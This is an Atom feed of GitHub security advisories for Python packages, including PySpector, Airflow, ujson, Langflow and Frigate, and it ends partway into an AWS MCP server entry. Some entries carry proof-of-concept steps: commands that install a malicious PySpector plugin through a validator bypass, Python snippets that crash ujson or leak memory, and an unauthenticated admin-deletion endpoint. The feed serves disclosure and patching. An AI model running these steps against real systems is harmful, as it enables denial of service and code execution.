<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2026-03-18T19:19:24.976Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[pyspector] Stored XSS in PySpector HTML Report Generation leads to Javascript Code Execution]]></title>
        <id>https://github.com/advisories/GHSA-2gmv-2r3v-jxj2</id>
        <link href="https://github.com/advisories/GHSA-2gmv-2r3v-jxj2"/>
        <updated>2026-03-18T16:33:47.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>PySpector versions <code>&lt;= 0.1.6</code> are affected by a stored Cross-Site Scripting (XSS) vulnerability in the HTML report generator. When PySpector scans a Python file containing JavaScript payloads (i.e. inside a string passed to <code>eval()</code> ), the flagged code snippet is interpolated into the HTML report without sanitization. Opening the generated report in a browser causes the embedded JavaScript to execute in the browser's local file context.</p>
<h3 id="impact">Impact</h3>
<p>An attacker can craft a malicious Python file (for example, hosted in a public repository), designed to be scanned by PySpector. When a victim scans this file and opens the resulting HTML report, arbitrary JavaScript executes in their browser. While the <code>file://</code> context limits the attacker's ability to exfiltrate cookies or make credentialed requests, the following is still achievable:</p>
<ul>
<li>Arbitrary DOM manipulation</li>
<li>Redirects to attacker-controlled pages</li>
<li>Theft of locally accessible data via <code>fetch()</code> or <code>XMLHttpRequest</code> to <code>file://</code> paths (browser-dependent)</li>
</ul>
<p>Any user of PySpector who scans untrusted code and generates HTML reports, is potentially affected.</p>
<h3 id="poc">PoC</h3>
<p>The following steps reproduce the vulnerability on PySpector <code>&lt;= 0.1.6</code>:</p>
<ol>
<li>Create a malicious Python file containing a JavaScript payload embedded in a string argument to <code>eval()</code>, and run PySpector against the file, generating an HTML report:<img width="871" height="752" alt="image" src="https://github.com/user-attachments/assets/1b0a57f2-3632-4347-a9b7-6a94dc2e82b2"></li>
<li>Open the generated HTML report in any browser:<img width="1920" height="920" alt="image" src="https://github.com/user-attachments/assets/a4075c4a-6153-41b4-ad77-81d009d7a9f8"></li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ParzivalHack/PySpector/security/advisories/GHSA-2gmv-2r3v-jxj2">https://github.com/ParzivalHack/PySpector/security/advisories/GHSA-2gmv-2r3v-jxj2</a></li>
<li><a href="https://github.com/advisories/GHSA-2gmv-2r3v-jxj2">https://github.com/advisories/GHSA-2gmv-2r3v-jxj2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2gmv-2r3v-jxj2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-18T16:33:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pyspector] PySpector has a Plugin Sandbox Bypass leads to Arbitrary Code Execution]]></title>
        <id>https://github.com/advisories/GHSA-v3xv-8vc3-h2m6</id>
        <link href="https://github.com/advisories/GHSA-v3xv-8vc3-h2m6"/>
        <updated>2026-03-18T16:33:36.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>PySpector versions <code>&lt;= 0.1.6</code> are affected by a security validation bypass in the plugin system. The <code>validate_plugin_code()</code> function in <code>plugin_system.py</code>, performs static AST analysis to block dangerous API calls before a plugin is trusted and executed. However, the <code>internal resolve_name()</code> helper only handles <code>ast.Name</code> and <code>ast.Attribute</code> node types, returning <code>None</code> for all others. When a plugin uses indirect function calls via <code>getattr()</code> (such as <code>getattr(os, 'system')</code>) the outer call's func node is of type <code>ast.Call</code>, causing <code>resolve_name()</code> to return <code>None</code>, and the security check to be silently skipped. The plugin incorrectly passes the trust workflow, and executes arbitrary system commands on the user's machine when loaded.</p>
<h3 id="impact">Impact</h3>
<p>An attacker who can deliver a malicious plugin file to a PySpector user and convince them to install it, can achieve arbitrary code execution on the user's local machine. Exploitation requires the victim to explicitly run <code>pyspector plugin install --trust</code> on the malicious file (a deliberate multi-step action that meaningfully limits the attack surface compared to passive vulnerabilities). However, the bypass directly undermines the security guarantee that <code>validate_plugin_code()</code> is designed to provide. Once the plugin is trusted and executed, the following is achievable:</p>
<ul>
<li>Full read/write access to the local filesystem</li>
<li>Exfiltration of sensitive data and environment variables (i.e. API keys, credentials, etc...)</li>
<li>Establishment of persistence mechanisms</li>
<li>Lateral movement in CI/CD environments where PySpector runs with elevated permissions (pre-commit hooks and scheduled scans)</li>
</ul>
<p>Any user of PySpector who installs third-party plugins outside the official repository is potentially affected.</p>
<h3 id="poc">PoC</h3>
<p>The following steps reproduce the vulnerability on PySpector <code>&lt;= 0.1.6</code>:</p>
<ol>
<li>Create a malicious plugin file that uses getattr-based indirect calls to bypass AST validation, and confirm the validator incorrectly marks it as safe:<img width="1300" height="675" alt="image" src="https://github.com/user-attachments/assets/4de3a0d1-1c77-4454-ad10-2369d5ca9997"></li>
<li>Run PySpector Plugin Validator module (this confirms the validator incorrectly marks the plugin as safe):<img width="908" height="239" alt="image" src="https://github.com/user-attachments/assets/3e3b9603-4d95-4a39-be97-4163f6639599"></li>
<li>Install and trust the plugin through the normal PySpector workflow:</li>
</ol>
<p><code>pyspector plugin install /tmp/evil_plugin.py --trust</code>
4. Execute the plugin, during a scan:
<code>pyspector scan /any/target --plugin evil</code></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ParzivalHack/PySpector/security/advisories/GHSA-v3xv-8vc3-h2m6">https://github.com/ParzivalHack/PySpector/security/advisories/GHSA-v3xv-8vc3-h2m6</a></li>
<li><a href="https://github.com/advisories/GHSA-v3xv-8vc3-h2m6">https://github.com/advisories/GHSA-v3xv-8vc3-h2m6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v3xv-8vc3-h2m6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-18T16:33:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow] Apache Airflow: Execution API HITL Endpoints Missing Per-Task Authorization]]></title>
        <id>https://github.com/advisories/GHSA-8x34-9q3v-h7g8</id>
        <link href="https://github.com/advisories/GHSA-8x34-9q3v-h7g8"/>
        <updated>2026-03-18T16:33:18.000Z</updated>
        <content type="html"><![CDATA[<p>Apache Airflow versions 3.1.0 through 3.1.7 missing authorization vulnerability in the Execution API's Human-in-the-Loop (HITL) endpoints that allows any authenticated task instance to read, approve, or reject HITL workflows belonging to any other task instance.</p>
<p>Users are recommended to upgrade to Apache Airflow 3.1.8 or later, which resolves this issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-30911">https://nvd.nist.gov/vuln/detail/CVE-2026-30911</a></li>
<li><a href="https://github.com/apache/airflow/pull/62886">https://github.com/apache/airflow/pull/62886</a></li>
<li><a href="https://lists.apache.org/thread/1rs2v7fcko2otl6n9ytthcj87cmsgx51">https://lists.apache.org/thread/1rs2v7fcko2otl6n9ytthcj87cmsgx51</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2026/03/17/2">http://www.openwall.com/lists/oss-security/2026/03/17/2</a></li>
<li><a href="https://github.com/advisories/GHSA-8x34-9q3v-h7g8">https://github.com/advisories/GHSA-8x34-9q3v-h7g8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8x34-9q3v-h7g8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-17T12:30:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow] Apache Airflow: Path of session token in cookie does not consider base_url - session hijacking via co-hosted applications]]></title>
        <id>https://github.com/advisories/GHSA-4fhm-p86v-hwpx</id>
        <link href="https://github.com/advisories/GHSA-4fhm-p86v-hwpx"/>
        <updated>2026-03-18T16:32:55.000Z</updated>
        <content type="html"><![CDATA[<p>Apache Airflow versions 3.1.0 through 3.1.7&nbsp;session token (_token) in cookies is set to path=/ regardless of the configured [webserver] base_url or [api] base_url.
This allows any application co-hosted under the same domain to capture valid Airflow session tokens from HTTP request headers, allowing full session takeover without attacking Airflow itself.</p>
<p>Users are recommended to upgrade to Apache Airflow 3.1.8 or later, which resolves this issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-28779">https://nvd.nist.gov/vuln/detail/CVE-2026-28779</a></li>
<li><a href="https://github.com/apache/airflow/pull/62771">https://github.com/apache/airflow/pull/62771</a></li>
<li><a href="https://lists.apache.org/thread/r4n5znb8mcq14wo9v8ndml36nxlksdqb">https://lists.apache.org/thread/r4n5znb8mcq14wo9v8ndml36nxlksdqb</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2026/03/17/3">http://www.openwall.com/lists/oss-security/2026/03/17/3</a></li>
<li><a href="https://github.com/advisories/GHSA-4fhm-p86v-hwpx">https://github.com/advisories/GHSA-4fhm-p86v-hwpx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4fhm-p86v-hwpx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-17T12:30:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow] Apache Airflow: DAG authorization bypass]]></title>
        <id>https://github.com/advisories/GHSA-x3fv-96qh-67m7</id>
        <link href="https://github.com/advisories/GHSA-x3fv-96qh-67m7"/>
        <updated>2026-03-18T16:19:31.000Z</updated>
        <content type="html"><![CDATA[<p>Apache Airflow versions 3.1.0 through 3.1.7 /ui/dependencies endpoint returns the full DAG dependency graph without filtering by authorized DAG IDs. This allows an authenticated user with only DAG Dependencies permission to enumerate DAGs they are not authorized to view.</p>
<p>Users are recommended to upgrade to Apache Airflow 3.1.8 or later, which resolves this issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-28563">https://nvd.nist.gov/vuln/detail/CVE-2026-28563</a></li>
<li><a href="https://github.com/apache/airflow/pull/62046">https://github.com/apache/airflow/pull/62046</a></li>
<li><a href="https://lists.apache.org/thread/dwzf62qg9z8wvfsjknpfd8bvtwghd49s">https://lists.apache.org/thread/dwzf62qg9z8wvfsjknpfd8bvtwghd49s</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2026/03/17/5">http://www.openwall.com/lists/oss-security/2026/03/17/5</a></li>
<li><a href="https://github.com/advisories/GHSA-x3fv-96qh-67m7">https://github.com/advisories/GHSA-x3fv-96qh-67m7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x3fv-96qh-67m7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-17T12:30:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow] Apache Airflow: Wildcard DagVersion Listing Bypasses Per‑DAG RBAC and Leaks Metadata]]></title>
        <id>https://github.com/advisories/GHSA-4m3h-wp5w-5hqh</id>
        <link href="https://github.com/advisories/GHSA-4m3h-wp5w-5hqh"/>
        <updated>2026-03-18T16:19:16.000Z</updated>
        <content type="html"><![CDATA[<p>Apache Airflow versions 3.0.0 through 3.1.7&nbsp;FastAPI DagVersion listing API does not apply per-DAG authorization filtering when the request is made with dag_id set to "~" (wildcard for all DAGs). As a result, version metadata of DAGs that the requester is not authorized to access is returned.</p>
<p>Users are recommended to upgrade to Apache Airflow 3.1.8 or later, which resolves this issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-26929">https://nvd.nist.gov/vuln/detail/CVE-2026-26929</a></li>
<li><a href="https://github.com/apache/airflow/pull/61675">https://github.com/apache/airflow/pull/61675</a></li>
<li><a href="https://lists.apache.org/thread/g5o6khx83jwqvdyn0mlyb0krt35cs9ss">https://lists.apache.org/thread/g5o6khx83jwqvdyn0mlyb0krt35cs9ss</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2026/03/17/4">http://www.openwall.com/lists/oss-security/2026/03/17/4</a></li>
<li><a href="https://github.com/advisories/GHSA-4m3h-wp5w-5hqh">https://github.com/advisories/GHSA-4m3h-wp5w-5hqh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4m3h-wp5w-5hqh</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-17T12:30:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pypdf] pypdf has inefficient decoding of array-based streams]]></title>
        <id>https://github.com/advisories/GHSA-qpxp-75px-xjcp</id>
        <link href="https://github.com/advisories/GHSA-qpxp-75px-xjcp"/>
        <updated>2026-03-18T16:17:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An attacker who uses this vulnerability can craft a PDF which leads to long runtimes and/or large memory usage. This requires accessing an array-based stream with lots of entries.</p>
<h3 id="patches">Patches</h3>
<p>This has been fixed in <a href="https://github.com/py-pdf/pypdf/releases/tag/6.9.1">pypdf==6.9.1</a>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If you cannot upgrade yet, consider applying the changes from PR <a href="https://github.com/py-pdf/pypdf/pull/3686">#3686</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/py-pdf/pypdf/security/advisories/GHSA-qpxp-75px-xjcp">https://github.com/py-pdf/pypdf/security/advisories/GHSA-qpxp-75px-xjcp</a></li>
<li><a href="https://github.com/py-pdf/pypdf/pull/3686">https://github.com/py-pdf/pypdf/pull/3686</a></li>
<li><a href="https://github.com/py-pdf/pypdf/releases/tag/6.9.1">https://github.com/py-pdf/pypdf/releases/tag/6.9.1</a></li>
<li><a href="https://github.com/advisories/GHSA-qpxp-75px-xjcp">https://github.com/advisories/GHSA-qpxp-75px-xjcp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qpxp-75px-xjcp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-18T16:17:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[frigate] Frigte has broken access control viewer user can delete admin and other users account]]></title>
        <id>https://github.com/advisories/GHSA-vg28-83rp-8xx4</id>
        <link href="https://github.com/advisories/GHSA-vg28-83rp-8xx4"/>
        <updated>2026-03-18T14:25:16.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Users with the viewer role can delete admin and other users account. It this leads to denial of service and affects data integrity.</p>
<h3 id="details">Details</h3>
<p>Endpoint <code>DELETE /api/users/admin</code> is enable to anonymous user.</p>
<img width="436" height="100" alt="obraz" src="https://github.com/user-attachments/assets/817f9c47-7bd9-4247-a2f1-0f40778ab229">

<h3 id="poc">PoC</h3>
<p>I deleted admin user on <code>demo.frigate.video</code>:</p>
<img width="1091" height="222" alt="obraz" src="https://github.com/user-attachments/assets/34f50a13-3bb7-4aa8-99fa-bd815b3dc915">


<h3 id="impact">Impact</h3>
<p>It this leads to denial of service and affects data integrity.</p>
<h3 id="recommended-fixes">Recommended Fixes</h3>
<p>Restrict access to the endpoint to authenticated admin users only:
Add <code>dependencies=[Depends(require_role(["admin"]))])</code> to this endpoint.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/blakeblackshear/frigate/security/advisories/GHSA-vg28-83rp-8xx4">https://github.com/blakeblackshear/frigate/security/advisories/GHSA-vg28-83rp-8xx4</a></li>
<li><a href="https://github.com/advisories/GHSA-vg28-83rp-8xx4">https://github.com/advisories/GHSA-vg28-83rp-8xx4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vg28-83rp-8xx4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-18T14:25:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ujson] UltraJSON has an integer overflow handling large indent leads to buffer overflow or infinite loop]]></title>
        <id>https://github.com/advisories/GHSA-c8rr-9gxc-jprv</id>
        <link href="https://github.com/advisories/GHSA-c8rr-9gxc-jprv"/>
        <updated>2026-03-18T13:01:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>ujson.dumps()</code> crashes the Python interpreter (segmentation fault) when the product of the <code>indent</code> parameter and the nested depth of the input exceeds INT32_MAX. It can also get stuck in an infinite loop if the <code>indent</code> is a large negative number. Both are caused by an integer overflow/underflow whilst calculating how much memory to reserve for indentation. And both can be used to achieve denial of service.</p>
<p>(Note: A negative indent to <code>ujson</code> means add spaces after colons but do not add line breaks or indentation. It is unclear to the current maintainers whether this was ever even an intended feature or just a byproduct of the way it was written.)</p>
<h3 id="exploitability">Exploitability</h3>
<p>To be vulnerable, a service must call <code>ujson.dump()</code>/<code>ujson.dumps()</code>/<code>ujson.encode()</code> whilst giving untrusted users control over the <code>indent</code> parameter and not restrict that indentation to reasonably small non-negative values. (Even with the fix for this vulnerability, such usage is strongly advised against since even a bug-free JSON serialiser would be vulnerable to denial of service simply by the attacker requesting indents that have the server needlessly filling out gigabytes of whitespace.)</p>
<p>A service may also be vulnerable to the infinite loop if it uses a fixed <em>negative</em> <code>indent</code>. An underflow always occurs for any negative indent when the input data is at least one level nested but, for small negative indents, the underflow is usually accidentally rectified by another overflow. As far as the maintainers are aware, the infinite loop can not be reached for indentations from -1 to -65536 / max_recursion_depth_as_limited_by_stack_size but users of negative indents are encouraged to consider their service affected even if the infinite loop seems unreachable.</p>
<h3 id="example">Example</h3>
<pre><code class="language-python">import ujson

def example(depth, indent):
    a = [0]
    for i in range(1000):
        a = [a]
    ujson.dumps(a, indent=indent)

example(1, 2**30)  # segfault
example(1000, -200)  # infinite loop
</code></pre>
<h3 id="patches">Patches</h3>
<p>ujson 5.12.0, containing 486bd4553dc471a1de11613bc7347a6b318e37ea, promotes the integer types where the overflow occurred, skips the indentation code path for negative indent (which was supposed to be a no-op) and places an artificial cap of 1000 on the <code>indent</code> parameter.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Users who don't wish to upgrade can either use a fixed indentation, no indentation or ensure indentation is non-negative and not enormous (below <code>2**31 / max_recursion_depth_as_limited_by_stack_size</code>).</p>
<h3 id="references">References</h3>
<p>The original bug report can be found at <a href="https://github.com/ultrajson/ultrajson/issues/700">https://github.com/ultrajson/ultrajson/issues/700</a></p>
<p>This issue was independently discovered by @coco1629, @EthanKim88 and @vmfunc.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/ultrajson/ultrajson/security/advisories/GHSA-c8rr-9gxc-jprv">https://github.com/ultrajson/ultrajson/security/advisories/GHSA-c8rr-9gxc-jprv</a></li>
<li><a href="https://github.com/ultrajson/ultrajson/issues/700">https://github.com/ultrajson/ultrajson/issues/700</a></li>
<li><a href="https://github.com/ultrajson/ultrajson/commit/486bd4553dc471a1de11613bc7347a6b318e37ea">https://github.com/ultrajson/ultrajson/commit/486bd4553dc471a1de11613bc7347a6b318e37ea</a></li>
<li><a href="https://github.com/advisories/GHSA-c8rr-9gxc-jprv">https://github.com/advisories/GHSA-c8rr-9gxc-jprv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c8rr-9gxc-jprv</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-18T13:01:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ujson] UltraJSON has a Memory Leak parsing large integers allows DoS ]]></title>
        <id>https://github.com/advisories/GHSA-wgvc-ghv9-3pmm</id>
        <link href="https://github.com/advisories/GHSA-wgvc-ghv9-3pmm"/>
        <updated>2026-03-18T13:01:16.000Z</updated>
        <content type="html"><![CDATA[<h4 id="summary">Summary</h4>
<p>ujson 5.4.0 to 5.11.0 inclusive contain an accumulating memory leak in JSON parsing <em>large</em> (outside of the range [-2^63, 2^64 - 1]) integers.</p>
<h4 id="exploitability">Exploitability</h4>
<p>Any service that calls <code>ujson.load()</code>/<code>ujson.loads()</code>/<code>ujson.decode()</code> on untrusted inputs is affected and vulnerable to denial of service attacks.</p>
<h4 id="details">Details</h4>
<p>The leaked memory is a copy of the string form of the integer plus an additional NULL byte. The leak occurs irrespective of whether the integer parses successfully or is rejected due to having more than <code>sys.get_int_max_str_digits()</code> digits, meaning that any sized leak per malicious JSON can be achieved provided that there is no limit on the overall size of the payload.</p>
<pre><code class="language-python">ujson.loads(str(2 ** 64 - 1))  # No leak
ujson.loads(str(2 ** 64))  # Leaks
ujson.loads(str(10 ** sys.get_int_max_str_digits()))  # Leaks and raises ValueError
</code></pre>
<h4 id="fix">Fix</h4>
<p>The leak is fixed in <code>ujson 5.12.0</code> (4baeb950df780092bd3c89fc702a868e99a3a1d2). There are no workarounds beyond upgrading to an unaffected version.</p>
<h4 id="credits">Credits</h4>
<p>Discovered by Cameron Criswell/Skevros using Coverage-guided fuzzing (libFuzzer + AddressSanitizer)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ultrajson/ultrajson/security/advisories/GHSA-wgvc-ghv9-3pmm">https://github.com/ultrajson/ultrajson/security/advisories/GHSA-wgvc-ghv9-3pmm</a></li>
<li><a href="https://github.com/ultrajson/ultrajson/commit/4baeb950df780092bd3c89fc702a868e99a3a1d2">https://github.com/ultrajson/ultrajson/commit/4baeb950df780092bd3c89fc702a868e99a3a1d2</a></li>
<li><a href="https://github.com/ultrajson/ultrajson/releases/tag/5.12.0">https://github.com/ultrajson/ultrajson/releases/tag/5.12.0</a></li>
<li><a href="https://github.com/advisories/GHSA-wgvc-ghv9-3pmm">https://github.com/advisories/GHSA-wgvc-ghv9-3pmm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wgvc-ghv9-3pmm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-18T13:01:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[langflow] Langflow is Missing Ownership Verification in API Key Deletion (IDOR)]]></title>
        <id>https://github.com/advisories/GHSA-rf6x-r45m-xv3w</id>
        <link href="https://github.com/advisories/GHSA-rf6x-r45m-xv3w"/>
        <updated>2026-03-18T12:58:35.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Detection Method:</strong> Kolega.dev Deep Code Scan</p>
<table>
<thead>
<tr>
<th>Attribute</th>
<th>Value</th>
</tr>
</thead>
<tbody><tr>
<td>Location</td>
<td>src/backend/base/langflow/api/v1/api_key.py:44-53</td>
</tr>
<tr>
<td>Practical Exploitability</td>
<td>High</td>
</tr>
<tr>
<td>Developer Approver</td>
<td><a href="mailto:faizan@kolega.ai">faizan@kolega.ai</a></td>
</tr>
</tbody></table>
<h3 id="description">Description</h3>
<p>The delete_api_key_route() endpoint accepts an api_key_id path parameter and deletes it with only a generic authentication check (get_current_active_user dependency). However, the delete_api_key() CRUD function does NOT verify that the API key belongs to the current user before deletion.</p>
<h3 id="affected-code">Affected Code</h3>
<pre><code>@router.delete("/{api_key_id}", dependencies=[Depends(auth_utils.get_current_active_user)])
async def delete_api_key_route(
    api_key_id: UUID,
    db: DbSession,
):
    try:
        await delete_api_key(db, api_key_id)
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e)) from e
    return {"detail": "API Key deleted"}
</code></pre>
<h3 id="evidence">Evidence</h3>
<p>In crud.py lines 44-49, delete_api_key() retrieves the API key by ID and deletes it without checking if the key belongs to the authenticated user. The endpoint also doesn't pass the current_user to the delete function for verification.</p>
<h3 id="impact">Impact</h3>
<p>An authenticated attacker can enumerate and delete API keys belonging to other users by guessing or discovering their API key IDs. This allows account takeover, denial of service, and disruption of other users' integrations.</p>
<h3 id="recommendation">Recommendation</h3>
<p>Modify the delete_api_key endpoint and function: (1) Pass current_user to the delete function; (2) In delete_api_key(), verify api_key.user_id == current_user.id before deletion; (3) Raise a 403 Forbidden error if the user doesn't own the key. Example: if api_key.user_id != user_id: raise HTTPException(status_code=403, detail='Unauthorized')</p>
<h3 id="notes">Notes</h3>
<p>Confirmed IDOR vulnerability. The delete_api_key_route endpoint at line 44-53 accepts an api_key_id and calls delete_api_key(db, api_key_id) without passing the current_user. The CRUD function delete_api_key() at crud.py:44-49 retrieves the API key by ID and deletes it without verifying ownership (api_key.user_id == current_user.id). Compare this to the GET endpoint at lines 17-28 which correctly filters by user_id, and the POST endpoint at lines 31-41 which correctly associates the key with user_id. An authenticated attacker can delete any user's API keys by guessing/enumerating UUIDs. Fix: Pass current_user to delete_api_key and verify api_key.user_id == current_user.id before deletion, returning 403 if unauthorized.</p>
<h3 id="developer-review-notes">Developer Review Notes</h3>
<p>Does not accept current_user as a parameter. Allowing deletion of any user's API keys even without permissions.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/langflow-ai/langflow/security/advisories/GHSA-rf6x-r45m-xv3w">https://github.com/langflow-ai/langflow/security/advisories/GHSA-rf6x-r45m-xv3w</a></li>
<li><a href="https://github.com/langflow-ai/langflow/commit/fdc1b3b1448ff3317d73d3e769a6c4a1717f74d7">https://github.com/langflow-ai/langflow/commit/fdc1b3b1448ff3317d73d3e769a6c4a1717f74d7</a></li>
<li><a href="https://github.com/langflow-ai/langflow/releases/tag/1.7.2">https://github.com/langflow-ai/langflow/releases/tag/1.7.2</a></li>
<li><a href="https://github.com/advisories/GHSA-rf6x-r45m-xv3w">https://github.com/advisories/GHSA-rf6x-r45m-xv3w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rf6x-r45m-xv3w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-18T12:58:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[bedrock-agentcore-starter-toolkit] Improper S3 ownership verification in Bedrock AgentCore Starter Toolkit]]></title>
        <id>https://github.com/advisories/GHSA-xfhr-q72q-jcrj</id>
        <link href="https://github.com/advisories/GHSA-xfhr-q72q-jcrj"/>
        <updated>2026-03-17T20:34:22.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>An issue has been identified in the Bedrock AgentCore Starter Toolkit versions prior to v0.1.13 that may allow a remote actor to inject code during the build process, leading to code execution in the AgentCore Runtime.</p>
<h2 id="impact">Impact</h2>
<p>A remote actor could inject code during the build process, leading to code execution in the AgentCore Runtime and a complete loss of confidentiality, integrity, and availability of the affected AgentCore resource.</p>
<p>Impacted versions:  All versions of Bedrock AgentCore Starter Toolkit versions before v0.1.13. This issue only affects users of the Bedrock AgentCore Starter Toolkit before version v0.1.13 who build the Toolkit after September 24, 2025. Any users on a version &gt;=v0.1.13, and any users on previous versions who built the toolkit before September 24, 2025 date are not affected. </p>
<h2 id="patches">Patches</h2>
<p>This issue has been addressed in version v0.1.13. AWS recommends upgrading to the latest version and ensuring any forked or derivative code is patched to incorporate the new fixes. </p>
<h2 id="workarounds">Workarounds</h2>
<p>N/A</p>
<h2 id="references">References</h2>
<p>If you have any questions or comments about this advisory, contact [AWS/Amazon] Security via our <a href="https://aws.amazon.com/security/vulnerability-reporting">vulnerability reporting page</a> or directly via email to <a href="mailto:aws-security@amazon.com">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/aws/bedrock-agentcore-starter-toolkit/security/advisories/GHSA-xfhr-q72q-jcrj">https://github.com/aws/bedrock-agentcore-starter-toolkit/security/advisories/GHSA-xfhr-q72q-jcrj</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-4269">https://nvd.nist.gov/vuln/detail/CVE-2026-4269</a></li>
<li><a href="https://aws.amazon.com/security/security-bulletins/2026-008-AWS">https://aws.amazon.com/security/security-bulletins/2026-008-AWS</a></li>
<li><a href="https://github.com/aws/bedrock-agentcore-starter-toolkit/releases/tag/v0.1.13">https://github.com/aws/bedrock-agentcore-starter-toolkit/releases/tag/v0.1.13</a></li>
<li><a href="https://github.com/advisories/GHSA-xfhr-q72q-jcrj">https://github.com/advisories/GHSA-xfhr-q72q-jcrj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xfhr-q72q-jcrj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-17T20:34:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[awslabs.aws-api-mcp-server] AWS API MCP File Access Restriction Bypass]]></title>
        <id>https://github.com/advisories/GHSA-2cpp-j2fc-qhp7</id>
        <link href="https://github.com/advisories/GHSA-2cpp-j2fc-qhp7"/>
        <updated>2026-03-17T20:33:17.000Z</updated>
        <content type="html"><![CDATA[<h3 id="description">Description</h3>
